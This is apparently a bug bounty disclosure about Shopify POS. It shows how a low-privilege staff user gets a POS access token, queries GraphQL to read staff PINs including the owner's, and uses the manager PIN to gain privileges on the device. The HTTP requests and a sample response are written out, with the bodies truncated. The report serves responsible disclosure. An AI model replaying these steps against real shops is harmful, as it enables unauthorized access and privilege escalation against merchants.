## Original Report

## Summary:
A low privilege user (both in the shop and in the POS) can read POS PINs via graphql and elevate his privilege with a physical access to the POS.

## Steps To Reproduce:
1. Log in to your shop and install the POS app https://apps.shopify.com/shopify-pos
2. Log in Shopify Plus as an org owner and create a user with the minimal privilege requirements

    {F1178771}
2. Go to the newly created user POS staff page (https://h1-2102-ramsexy.myshopify.com/admin/apps/pos/staff/61357948984) and check "Give Point of Sale access" and select Associate role.

    {F1178781}
3. Go back to the user permission page in Shopify Plus, and remove all permission from the newly created user. Please notice the following message about POS. 
    {F1178787}
4. As the low priv user, request a POS `access_token` :

    Request :

    ```http
POST /admin/api/xauth HTTP/1.1
Accept: application/json
Content-Type: application/json; charset=UTF-8
Content-Length: 137
Host: h1-2102-ramsexy.myshopify.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/4.0.0

``` 

    Response :

        "email_verified": true
}
```
    * The `api_key` can be found in the page at https://h1-2102-ramsexy.myshopify.com/admin/apps/pos.
    * The `login` and `password` are your low privilege user credentials

5. Using this `access_token` in the `X-Shopify-Access-Token` header, you can query the graphql endpoint to retrieve the POS staff information, including PINs:

    Request:
    ```http
POST /admin/api/unversioned/graphql HTTP/1.1
Host: h1-2102-ramsexy.myshopify.com
Content-Type: application/json
Connection: close
X-Shopify-Override-User-Locale: en-US
X-Shopify-Access-Token: ███
Accept: application/json
User-Agent: Shopify POS/iOS/6.28.0 (iPhone8,4/com.jadedpixel.pos/14.2.0) - Build 855
Content-Length: 1002
Accept-Language: en-us
Accept-Encoding: gzip, deflate

```

    Response:

    ```json
[...]
    "__typename": "StaffMember",
    "active": true,
    "email": "ramsexy+h1-2102@wearehackerone.com",
    "name": "Ram Sexy",
    "firstName": "Ram",
    "lastName": "Sexy",
    "phone": null,
    "pin": "3333",
    "id": "gid:\/\/shopify\/StaffMember\/61340352568",
    "isShopOwner": true
[...]
```

6. Using that information, the low privilege user can use the Manager PIN while using the POS device, which allow him to perform various actions he should not be able to do.

## Impact

A low privilege user (both in the shop and in the POS) who should only be able to log into the POS with limited privilege using his PIN can retrieve Manager PIN to elevate his privilege.
